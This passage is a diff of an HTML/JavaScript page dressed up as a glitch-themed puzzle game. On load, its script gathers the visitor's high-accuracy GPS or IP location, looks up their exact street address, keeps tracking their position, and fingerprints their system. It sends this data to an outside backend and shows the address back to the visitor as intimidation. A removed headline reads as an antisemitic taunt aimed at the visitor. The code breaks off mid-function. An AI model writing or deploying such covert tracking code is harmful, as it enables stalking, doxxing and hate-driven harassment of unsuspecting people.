@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ANAL-TIME</title>
+    <title>🔮 NEXUS://REALITY_GLITCH</title>
     <style>
         * {
             margin: 0;
@@ -11,26 +11,57 @@
             box-sizing: border-box;
         }
 
+        @keyframes corrupt {
+            0% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
+            10% { transform: translate(-10px, 10px) rotate(1deg); filter: hue-rotate(90deg) blur(2px); }
+            20% { transform: translate(10px, -10px) rotate(-1deg); filter: hue-rotate(180deg) blur(0px); }
+            30% { transform: translate(-5px, 5px) rotate(2deg); filter: hue-rotate(270deg) blur(3px); }
+            40% { transform: translate(5px, -5px) rotate(-2deg); filter: hue-rotate(360deg) blur(1px); }
+            50% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
         body {
             background: #000;
             color: #0f0;
             font-family: 'Courier New', monospace;
+            min-height: 100vh;
             padding: 20px;
             background-image: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 2px);
+            position: relative;
+            overflow-x: hidden;
         }
 
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
+        /* Matrix rain background */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: 0;
         }
 
         .terminal {
             background: rgba(0,20,0,0.95);
-            border: 3px solid #0f0;
+            border: 2px solid #0f0;
             box-shadow: 0 0 30px rgba(0,255,0,0.3);
-            padding: 30px;
-            margin: 20px 0;
+            padding: 20px;
+            margin: 20px;
             position: relative;
+            z-index: 1;
+            backdrop-filter: blur(2px);
         }
 
         .terminal::before {
@@ -45,77 +76,98 @@
         }
 
         @keyframes pulse {
-            0% { text-shadow: 0 0 5px #0f0; }
-            50% { text-shadow: 0 0 30px #0f0; }
-            100% { text-shadow: 0 0 5px #0f0; }
+            0% { text-shadow: 0 0 5px #ff0000; opacity: 1; }
+            50% { text-shadow: 0 0 30px #ff0000; opacity: 0.5; }
+            100% { text-shadow: 0 0 5px #ff0000; opacity: 1; }
         }
 
         .glitch-text {
             font-size: 2rem;
             color: #0f0;
             text-shadow: 2px 2px 0 #ff0000, -2px -2px 0 #0000ff;
-            animation: glitch 3s infinite;
-            margin-bottom: 30px;
-            text-align: center;
+            animation: corrupt 5s infinite;
+            margin-bottom: 20px;
+            word-break: break-word;
         }
 
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(2px, -2px); }
-            60% { transform: translate(-2px, -2px); }
-            80% { transform: translate(2px, 2px); }
-            100% { transform: translate(0); }
-        }
-
-        .location-card {
-            border: 2px solid #0f0;
-            padding: 20px;
-            margin: 20px 0;
+        .data-stream {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #0f0;
+            line-height: 12px;
+            opacity: 0.5;
+            white-space: pre;
+            overflow: hidden;
+            height: 100px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            pointer-events: none;
+            z-index: 9999;
             background: rgba(0,0,0,0.8);
+            padding: 5px;
         }
 
-        .coord-display {
-            font-size: 2rem;
-            text-align: center;
-            margin: 20px 0;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000;
-            animation: flicker 2s infinite;
-        }
-
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .data-panel {
-            background: #000;
-            border: 2px solid #0f0;
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
+            gap: 25px;
             padding: 20px;
-            margin: 15px 0;
-            font-size: 1.1rem;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-break: break-all;
+            max-width: 2000px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
         }
 
-        .address-panel {
-            background: #000;
-            border: 2px solid #ff0000;
+        .puzzle-card {
+            background: rgba(0,30,0,0.98);
+            border: 3px solid #0f0;
             padding: 20px;
-            margin: 15px 0;
-            font-size: 1.2rem;
-            color: #ff0000;
-            box-shadow: 0 0 20px #ff0000;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            min-height: 400px;
+            box-shadow: 0 0 50px rgba(0,255,0,0.2);
+            backdrop-filter: blur(5px);
+        }
+
+        .puzzle-card:hover {
+            transform: scale(1.02);
+            border-color: #ff0000;
+            box-shadow: 0 0 80px rgba(255,0,0,0.4);
+        }
+
+        .puzzle-card::after {
+            content: "";
+            position: absolute;
+            top: -100%;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(transparent, rgba(0,255,0,0.1));
+            animation: scan 3s linear infinite;
+            pointer-events: none;
+        }
+
+        .card-header {
+            font-size: 1.5rem;
+            color: #0f0;
+            border-bottom: 2px dashed #0f0;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .btn {
             background: #000;
             color: #0f0;
             border: 3px solid #0f0;
-            padding: 15px 30px;
+            padding: 15px 25px;
             font-size: 1.2rem;
             font-family: 'Courier New', monospace;
             cursor: pointer;
@@ -124,55 +176,125 @@
             margin: 10px 0;
             text-transform: uppercase;
             letter-spacing: 2px;
+            position: relative;
+            z-index: 2;
         }
 
         .btn:hover {
             background: #0f0;
             color: #000;
             box-shadow: 0 0 50px #0f0;
-            transform: scale(1.02);
+            transform: scale(1.05);
+        }
+
+        .btn.danger:hover {
+            background: #ff0000;
+            border-color: #ff0000;
+            box-shadow: 0 0 50px #ff0000;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .data-panel {
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 15px;
+            font-size: 0.9rem;
+            max-height: 300px;
+            overflow-y: auto;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            scrollbar-width: thin;
+            scrollbar-color: #0f0 #000;
+        }
+
+        .data-panel::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .data-panel::-webkit-scrollbar-track {
+            background: #000;
+        }
+
+        .data-panel::-webkit-scrollbar-thumb {
+            background: #0f0;
+            border-radius: 4px;
+        }
+
+        .location-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .coord-display {
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 15px;
+            text-align: center;
+            font-size: 1.3rem;
+            animation: flicker 2s infinite;
+            font-weight: bold;
         }
 
         .threat-indicator {
             position: fixed;
             top: 20px;
             right: 20px;
-            width: 150px;
-            height: 150px;
-            border: 4px solid #ff0000;
+            width: 200px;
+            height: 200px;
+            border: 4px solid #0f0;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             z-index: 9999;
-            animation: pulse-red 2s infinite;
-        }
-
-        @keyframes pulse-red {
-            0% { box-shadow: 0 0 10px #ff0000; }
-            50% { box-shadow: 0 0 50px #ff0000; }
-            100% { box-shadow: 0 0 10px #ff0000; }
+            animation: pulse 2s infinite;
+            backdrop-filter: blur(5px);
         }
 
         .threat-number {
-            font-size: 2.5rem;
+            font-size: 3rem;
             color: #ff0000;
+            font-weight: bold;
         }
 
-        .map-link {
-            display: inline-block;
-            margin: 10px;
-            padding: 10px;
-            border: 2px solid #0f0;
-            color: #0f0;
-            text-decoration: none;
-        }
-
-        .map-link:hover {
+        .timeline {
+            position: fixed;
+            bottom: 120px;
+            left: 20px;
+            right: 20px;
+            height: 5px;
             background: #0f0;
-            color: #000;
+            z-index: 9998;
+        }
+
+        .timeline-progress {
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+            transition: width 1s;
+        }
+
+        .timeline-event {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #0f0;
+            font-size: 0.8rem;
+            white-space: nowrap;
+            background: rgba(0,0,0,0.8);
+            padding: 2px 10px;
+            border-radius: 10px;
         }
 
         .hidden-message {
@@ -180,8 +302,9 @@
             background: #000;
             cursor: pointer;
             transition: all 0.3s;
-            text-align: center;
             padding: 10px;
+            text-align: center;
+            margin-top: 20px;
         }
 
         .hidden-message:hover {
@@ -189,451 +312,765 @@
             background: transparent;
         }
 
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            padding: 10px;
-            border: 2px solid #0f0;
-            font-size: 0.9rem;
-        }
-
-        .fragment-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .fragment {
+        .puzzle-piece {
+            display: inline-block;
             width: 50px;
             height: 50px;
             border: 2px solid #0f0;
+            margin: 5px;
+            cursor: pointer;
             transition: all 0.3s;
         }
 
-        .fragment.found {
+        .puzzle-piece.found {
             background: #0f0;
             box-shadow: 0 0 30px #0f0;
+            animation: pulse 1s infinite;
+        }
+
+        .puzzle-piece.missing {
+            opacity: 0.3;
+        }
+
+        .qr-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .satellite-img {
+            width: 100%;
+            height: 200px;
+            border: 2px solid #0f0;
+            object-fit: cover;
+            filter: grayscale(100%) contrast(1.2) brightness(0.8);
+            margin: 10px 0;
+        }
+
+        .copy-btn {
+            background: transparent;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            margin-left: 10px;
+        }
+
+        .copy-btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+        }
+
+        .status-online {
+            background: #0f0;
+            color: #000;
+        }
+
+        .status-offline {
+            background: #f00;
+            color: #fff;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border: 2px solid #0f0;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 15px;
+            max-width: 300px;
+            z-index: 10000;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+
+        .coordinates-text {
+            user-select: all;
+            background: #0f0;
+            color: #000;
+            padding: 2px 5px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Threat Indicator -->
-        <div class="threat-indicator">
-            <div>THREAT</div>
-            <div class="threat-number" id="threatLevel">0</div>
-            <div id="threatMessage">SCANNING</div>
+    <!-- Matrix rain background -->
+    <canvas id="matrixCanvas" class="matrix-rain"></canvas>
+    
+    <!-- Threat indicator -->
+    <div class="threat-indicator">
+        <div>THREAT LEVEL</div>
+        <div class="threat-number" id="threatLevel">0</div>
+        <div id="threatMessage">SCANNING</div>
+    </div>
+
+    <!-- Timeline -->
+    <div class="timeline">
+        <div class="timeline-progress" id="timelineProgress"></div>
+        <div class="timeline-event" id="timelineEvent">INITIALIZING...</div>
+    </div>
+
+    <!-- Data stream -->
+    <div class="data-stream" id="dataStream"></div>
+
+    <!-- Main header -->
+    <div class="terminal" style="margin: 10px;">
+        <div class="glitch-text" id="mainHeader">> NEXUS // REALITY INTERFACE v2.3.3.7</div>
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div id="systemTime" style="color: #0f0; font-size: 0.9rem;"></div>
+            <div id="userId" style="color: #0f0; font-size: 0.8rem;"></div>
+        </div>
+        <div id="connectionStatus" style="color: #0f0; font-size: 0.9rem;"></div>
+    </div>
+
+    <!-- Main puzzle grid -->
+    <div class="grid-container">
+        <!-- GEOLOCATION NEXUS - EXACT LOCATION -->
+        <div class="puzzle-card">
+            <div class="card-header">
+                <span>🌍 EXACT GEOLOCATION</span>
+                <span class="status-badge status-online" id="gpsStatus">GPS: ACTIVE</span>
+            </div>
+            <div class="location-grid">
+                <div class="coord-display" id="latitude">--.------</div>
+                <div class="coord-display" id="longitude">--.------</div>
+            </div>
+            <div class="data-panel" id="exactAddress">
+                <span class="loading"></span> Acquiring exact location...
+            </div>
+            <div class="data-panel" id="locationDetails" style="max-height: 200px;"></div>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn" id="copyCoordinates" style="width: auto; flex: 1;">📋 COPY</button>
+                <button class="btn" id="openMaps" style="width: auto; flex: 1;">🗺️ MAPS</button>
+                <button class="btn" id="openStreetView" style="width: auto; flex: 1;">📸 STREET</button>
+            </div>
+            <button class="btn" id="refreshLocation">🔄 REFRESH EXACT LOCATION</button>
+            <div id="locationSource" style="font-size: 0.8rem; margin-top: 10px;"></div>
         </div>
 
-        <!-- Main Terminal -->
-        <div class="terminal">
-            <div class="glitch-text">I SEE YOU JEW</div>
-            
-            <div class="status-bar">
-                <span id="systemTime">TIME: --:--:--</span>
-                <span id="userCount">USERS: <span id="onlineUsers">0000</span></span>
-                <span id="fragmentCount">FRAGMENTS: <span id="fragmentsFound">0/9</span></span>
+        <!-- SYSTEM FINGERPRINT -->
+        <div class="puzzle-card">
+            <div class="card-header">
+                <span>💻 SYSTEM FINGERPRINT</span>
+                <span class="status-badge status-online">ACTIVE</span>
             </div>
-
-            <!-- Location Card -->
-            <div class="location-card">
-                <h2>📍 YOUR EXACT LOCATION</h2>
-                
-                <div class="coord-display" id="coordinates">
-                    --.------, --.------
-                </div>
-
-                <div class="address-panel" id="addressPanel">
-                    <b>Exact Address:</b><br>
-                    <span id="fullAddress">Acquiring precise location...</span>
-                </div>
-
-                <div class="data-panel" id="locationDetails">
-                    <b>Location Details:</b><br>
-                    <span id="locationDetailsText">Initializing GPS...</span>
-                </div>
-
-                <div style="display: flex; gap: 10px; margin: 20px 0;">
-                    <a id="googleMapsLink" href="#" target="_blank" class="btn" style="text-align: center;">🗺️ OPEN IN GOOGLE MAPS</a>
-                    <a id="streetViewLink" href="#" target="_blank" class="btn" style="text-align: center;">📸 OPEN STREET VIEW</a>
-                </div>
-
-                <button class="btn" id="refreshLocation">🔄 REFRESH EXACT LOCATION</button>
-                <button class="btn" id="copyCoordinates">📋 COPY COORDINATES</button>
-            </div>
-
-            <!-- System Info -->
-            <div class="location-card">
-                <h2>💻 SYSTEM FINGERPRINT</h2>
-                <div class="data-panel" id="sysInfo"></div>
-                <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
-            </div>
-
-            <!-- Hidden Message -->
-            <div class="hidden-message" onclick="revealSecret()">
-                [ACCESS RESTRICTED - CLICK TO ATTEMPT DECRYPTION]
-            </div>
+            <div class="data-panel" id="sysInfo"></div>
+            <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
+            <div class="data-panel" id="hardwareInfo" style="display: none;"></div>
+            <div id="fingerprintHash" style="font-size: 0.7rem; margin-top: 10px;"></div>
         </div>
 
-        <!-- Fragments -->
-        <div class="terminal">
-            <h2>🧩 REALITY FRAGMENTS</h2>
-            <div class="fragment-container" id="fragmentContainer"></div>
+        <!-- THE FORBIDDEN BUTTON -->
+        <div class="puzzle-card">
+            <div class="card-header">
+                <span>🚫 [REDACTED]</span>
+                <span class="status-badge status-offline" id="buttonStatus">WAITING</span>
+            </div>
+            <button class="btn danger" id="forbiddenButton">!!! DO NOT PRESS !!!</button>
+            <div class="data-panel" id="pressHistory">Presses: 0</div>
+            <div class="data-panel" id="buttonMessages" style="color: #ff0000; min-height: 80px;"></div>
+            <div id="pressWarning" style="color: #ff0000; font-size: 0.8rem;"></div>
         </div>
 
-        <!-- Timeline -->
-        <div class="terminal">
-            <h2>⏳ TRACKING TIMELINE</h2>
-            <div class="data-panel" id="timelinePanel"></div>
-            <button class="btn" id="scanTimeline">📅 UPDATE TIMELINE</button>
+        <!-- REALITY FRAGMENTS -->
+        <div class="puzzle-card">
+            <div class="card-header">
+                <span>🧩 REALITY FRAGMENTS</span>
+                <span class="status-badge" id="fragmentStatus">0/9</span>
+            </div>
+            <div id="puzzlePieces" class="qr-container"></div>
+            <div class="data-panel" id="fragmentsFound">0/9 fragments collected</div>
+            <div id="fragmentMessage" style="font-size: 0.8rem;"></div>
         </div>
 
-        <!-- Data Stream -->
-        <div class="terminal" style="height: 200px; overflow-y: auto;" id="dataStream">
-            >> SYSTEM INITIALIZED...
+        <!-- DEEP WEB SCAN -->
+        <div class="puzzle-card">
+            <div class="card-header">🌐 DEEP WEB SCAN</div>
+            <button class="btn" id="scanDarkWeb">💀 SCAN DARK WEB</button>
+            <div class="data-panel" id="darkWebData"></div>
+            <div id="darkWebThreat" style="color: #ff0000;"></div>
+        </div>
+
+        <!-- SURVEILLANCE FEED -->
+        <div class="puzzle-card">
+            <div class="card-header">🛰️ SATELLITE FEED</div>
+            <img id="satelliteImage" class="satellite-img" src="" alt="Satellite Feed">
+            <div class="data-panel" id="satelliteInfo"></div>
+            <button class="btn" id="refreshSatellite">🔄 UPDATE FEED</button>
+        </div>
+
+        <!-- ENCRYPTED TRANSMISSIONS -->
+        <div class="puzzle-card">
+            <div class="card-header">📡 ENCRYPTED TRANSMISSIONS</div>
+            <div class="data-panel" id="transmissions"></div>
+            <button class="btn" id="newTransmission">📩 RECEIVE</button>
+        </div>
+
+        <!-- THREAT ANALYSIS -->
+        <div class="puzzle-card">
+            <div class="card-header">⚠️ THREAT ANALYSIS</div>
+            <div class="data-panel" id="threatAnalysis"></div>
+            <div id="threatHistory"></div>
         </div>
     </div>
 
+    <!-- Hidden footer -->
+    <div class="terminal" style="margin-top: 50px;">
+        <div style="text-align: center; color: #0f0; opacity: 0.5;" id="footerText">
+            > SYSTEM STATUS: [ACTIVE] // USERS TRACKED: <span id="totalUsers">---</span> // ENCRYPTION: [AES-256]
+        </div>
+        <div class="hidden-message" onclick="revealSecret()">[CLASSIFIED - CLICK FOR ACCESS]</div>
+    </div>
+
+    <!-- Toast notification container -->
+    <div id="toastContainer"></div>
+
     <script>
         // ==================== CONFIG ====================
-        const BACKEND_URL = 'https://b-n1nt.onrender.com';
-        let puzzlePieces = 0;
-        let buttonPresses = 0;
+        const BACKEND_URL = 'https://b-n1nt.onrender.com'; // Your Render backend URL
+        let userId = null;
         let threatLevel = 0;
+        let buttonPresses = 0;
+        let fragments = [];
         let currentLocation = null;
-        let locationHistory = [];
+        let systemInfo = null;
+        let watchId = null;
+        let transmissionInterval = null;
 
-        // ==================== EXACT LOCATION TRACKING ====================
-        async function getExactLocation() {
-            logToStream('📍 Requesting exact GPS coordinates...');
-            
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    logToStream('❌ Geolocation not supported');
-                    reject('Geolocation not supported');
-                    return;
-                }
+        // ==================== INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', async () => {
+            await initializeSystem();
+            startDataStream();
+            initMatrixRain();
+            updateTime();
+            createPuzzlePieces();
+            await getStats();
+        });
 
-                // High accuracy settings for exact location
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        currentLocation = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp
-                        };
-
-                        // Update display
-                        document.getElementById('coordinates').innerHTML = 
-                            `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
-
-                        // Get exact address using reverse geocoding
-                        await getExactAddress(currentLocation.lat, currentLocation.lon);
-                        
-                        // Update threat level based on accuracy
-                        const threatIncrease = Math.max(10, Math.min(50, Math.floor(100 - currentLocation.accuracy)));
-                        updateThreatLevel(threatIncrease);
-                        
-                        // Send to backend
-                        await sendToBackend('location', currentLocation);
-                        
-                        // Update Google Maps links
-                        updateMapLinks();
-                        
-                        logToStream(`✅ EXACT LOCATION ACQUIRED - Accuracy: ${currentLocation.accuracy.toFixed(1)}m`);
-                        
-                        // Add to timeline
-                        addToTimeline(`📍 Location tracked: ${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`);
-                        
-                        resolve(currentLocation);
-                    },
-                    (error) => {
-                        logToStream(`❌ Location error: ${error.message}`);
-                        
-                        // Fallback to IP location
-                        getIPLocation();
-                        reject(error);
-                    },
-                    {
-                        enableHighAccuracy: true,        // Request exact location
-                        timeout: 10000,                   // Wait up to 10 seconds
-                        maximumAge: 0                      // Don't use cached location
-                    }
-                );
-            });
-        }
-
-        // ==================== EXACT ADDRESS LOOKUP ====================
-        async function getExactAddress(lat, lon) {
+        async function initializeSystem() {
             try {
-                // Using OpenStreetMap Nominatim for free reverse geocoding
-                const response = await fetch(
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
-                    {
-                        headers: {
-                            'User-Agent': 'NEXUS-Tracker/1.0'
-                        }
-                    }
-                );
+                // Collect system info
+                await collectSystemInfo();
                 
-                const data = await response.json();
+                // Get location immediately
+                await getExactLocation();
                 
-                if (data && data.display_name) {
-                    // Extract all address components
-                    const address = data.address || {};
-                    
-                    // Build full address
-                    const fullAddress = data.display_name;
-                    
-                    // Update display with EXACT address
-                    document.getElementById('fullAddress').innerHTML = fullAddress;
-                    
-                    // Add all details to location panel
-                    document.getElementById('locationDetailsText').innerHTML = `
-                        🏠 House: ${address.house_number || 'N/A'}<br>
-                        🛣️ Road: ${address.road || address.street || 'N/A'}<br>
-                        🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}<br>
-                        🏙️ City: ${address.city || address.town || address.village || 'N/A'}<br>
-                        🗺️ County: ${address.county || 'N/A'}<br>
-                        📍 State: ${address.state || 'N/A'}<br>
-                        📮 ZIP: ${address.postcode || 'N/A'}<br>
-                        🌍 Country: ${address.country || 'N/A'}<br>
-                        🎯 Accuracy: ${currentLocation.accuracy.toFixed(1)} meters<br>
-                        📡 Source: GPS (High Accuracy)
-                    `;
-
-                    // Update currentLocation with address data
-                    currentLocation = {
-                        ...currentLocation,
-                        address: fullAddress,
-                        house_number: address.house_number,
-                        road: address.road || address.street,
-                        neighbourhood: address.neighbourhood || address.suburb,
-                        city: address.city || address.town || address.village,
-                        county: address.county,
-                        state: address.state,
-                        zip: address.postcode,
-                        country: address.country
-                    };
-
-                    logToStream(`📍 Address found: ${fullAddress.substring(0, 50)}...`);
-                }
+                // Start watching position for updates
+                startWatchingPosition();
+                
+                // Send initial data to backend
+                await sendToBackend('system', systemInfo);
+                
+                showToast('System initialized', 'success');
             } catch (error) {
-                console.error('Reverse geocoding error:', error);
-                document.getElementById('fullAddress').innerHTML = 'Address lookup failed';
-                document.getElementById('locationDetailsText').innerHTML = 
-                    `Latitude: ${lat.toFixed(6)}<br>Longitude: ${lon.toFixed(6)}<br>Accuracy: ${currentLocation.accuracy.toFixed(1)}m`;
+                console.error('Init error:', error);
+                showToast('System error', 'error');
             }
         }
 
-        // ==================== IP LOCATION FALLBACK ====================
-        async function getIPLocation() {
-            logToStream('🌐 Falling back to IP geolocation...');
+        // ==================== EXACT LOCATION TRACKING ====================
+        async function getExactLocation() {
+            document.getElementById('exactAddress').innerHTML = '<span class="loading"></span> Acquiring GPS signal...';
             
+            try {
+                // Try GPS first (most accurate)
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    await processLocation(position.coords, 'GPS (High Accuracy)');
+                } else {
+                    // Fallback to IP geolocation
+                    await getIPLocation();
+                }
+            } catch (gpsError) {
+                console.log('GPS failed, trying IP:', gpsError);
+                await getIPLocation();
+            }
+        }
+
+        async function processLocation(coords, source) {
+            const lat = coords.latitude;
+            const lon = coords.longitude;
+            const accuracy = coords.accuracy || 1000;
+
+            currentLocation = {
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy,
+                source: source
+            };
+
+            // Update display
+            document.getElementById('latitude').textContent = lat.toFixed(6);
+            document.getElementById('longitude').textContent = lon.toFixed(6);
+            document.getElementById('locationSource').innerHTML = `📡 Source: ${source} | 🎯 Accuracy: ${accuracy.toFixed(1)}m`;
+            
+            // Get reverse geocoding for exact address
+            await getExactAddress(lat, lon);
+            
+            // Update threat level based on accuracy
+            updateThreatLevel(Math.min(30, Math.floor(accuracy / 10)));
+            
+            // Send to backend
+            await sendToBackend('location', currentLocation);
+        }
+
+        async function getExactAddress(lat, lon) {
+            try {
+                // Using OpenStreetMap Nominatim for reverse geocoding
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const data = await response.json();
+                
+                const address = data.address || {};
+                
+                // Format exact address
+                const addressParts = [];
+                if (address.house_number) addressParts.push(address.house_number);
+                if (address.road) addressParts.push(address.road);
+                if (address.suburb) addressParts.push(address.suburb);
+                if (address.city || address.town || address.village) {
+                    addressParts.push(address.city || address.town || address.village);
+                }
+                if (address.county) addressParts.push(address.county);
+                if (address.state) addressParts.push(address.state);
+                if (address.postcode) addressParts.push(address.postcode);
+                if (address.country) addressParts.push(address.country);
+
+                const fullAddress = addressParts.join(', ');
+                
+                document.getElementById('exactAddress').innerHTML = `
+                    <strong>Exact Address:</strong><br>
+                    ${fullAddress}
+                `;
+
+                // Display all available details
+                const details = [];
+                if (address.house_number) details.push(`🏠 House: ${address.house_number}`);
+                if (address.road) details.push(`🛣️ Road: ${address.road}`);
+                if (address.neighbourhood || address.suburb) details.push(`🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}`);
+                if (address.city || address.town || address.village) details.push(`🏙️ City: ${address.city || address.town || address.village}`);
+                if (address.county) details.push(`🗺️ County: ${address.county}`);
+                if (address.state) details.push(`📍 State: ${address.state}`);
+                if (address.postcode) details.push(`📮 ZIP: ${address.postcode}`);
+                if (address.country) details.push(`🌍 Country: ${address.country}`);
+                
+                document.getElementById('locationDetails').innerHTML = details.join('<br>');
+
+                // Add to location data
+                currentLocation = {
+                    ...currentLocation,
+                    address: fullAddress,
+                    house_number: address.house_number,
+                    road: address.road,
+                    neighbourhood: address.neighbourhood || address.suburb,
+                    city: address.city || address.town || address.village,
+                    county: address.county,
+                    state: address.state,
+                    zip: address.postcode,
+                    country: address.country
+                };
+
+                // Update satellite image
+                updateSatelliteImage(lat, lon);
+                
+            } catch (error) {
+                console.error('Reverse geocoding failed:', error);
+                document.getElementById('exactAddress').innerHTML = 'Address lookup failed';
+            }
+        }
+
+        async function getIPLocation() {
             try {
                 const response = await fetch('http://ip-api.com/json/');
                 const data = await response.json();
                 
                 if (data.status === 'success') {
-                    currentLocation = {
-                        lat: data.lat,
-                        lon: data.lon,
-                        accuracy: 1000,
-                        city: data.city,
-                        region: data.regionName,
-                        country: data.country,
-                        zip: data.zip,
-                        isp: data.isp,
-                        source: 'ip'
-                    };
-
-                    document.getElementById('coordinates').innerHTML = 
-                        `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
+                    await processLocation({
+                        latitude: data.lat,
+                        longitude: data.lon,
+                        accuracy: 1000
+                    }, 'IP Geolocation');
                     
-                    document.getElementById('fullAddress').innerHTML = 
-                        `${data.city}, ${data.regionName}, ${data.country} ${data.zip || ''}`;
-                    
-                    document.getElementById('locationDetailsText').innerHTML = `
-                        📍 IP Location (Less Accurate)<br>
-                        City: ${data.city}<br>
-                        Region: ${data.regionName}<br>
-                        Country: ${data.country}<br>
-                        ZIP: ${data.zip || 'N/A'}<br>
-                        ISP: ${data.isp || 'N/A'}<br>
-                        Accuracy: ~1km
+                    document.getElementById('exactAddress').innerHTML = `
+                        <strong>IP-Based Location:</strong><br>
+                        ${data.city}, ${data.regionName}, ${data.country}<br>
+                        ISP: ${data.isp || 'Unknown'}
                     `;
-
-                    updateMapLinks();
-                    await sendToBackend('location', currentLocation);
-                    addToTimeline(`📍 IP Location: ${data.city}, ${data.country}`);
                 }
             } catch (error) {
-                logToStream(`❌ IP location failed: ${error.message}`);
+                console.error('IP location failed:', error);
+                document.getElementById('exactAddress').innerHTML = 'Location unavailable';
             }
         }
 
-        // ==================== UPDATE MAP LINKS ====================
-        function updateMapLinks() {
-            if (currentLocation) {
-                const mapsUrl = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}`;
-                const streetViewUrl = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}&layer=c`;
-                
-                document.getElementById('googleMapsLink').href = mapsUrl;
-                document.getElementById('streetViewLink').href = streetViewUrl;
+        function startWatchingPosition() {
+            if (navigator.geolocation) {
+                watchId = navigator.geolocation.watchPosition(
+                    async (position) => {
+                        await processLocation(position.coords, 'GPS (Real-time)');
+                    },
+                    (error) => console.log('Watch error:', error),
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 5000
+                    }
+                );
             }
         }
 
-        // ==================== COPY COORDINATES ====================
-        function copyCoordinates() {
-            if (currentLocation) {
-                const coords = `${currentLocation.lat}, ${currentLocation.lon}`;
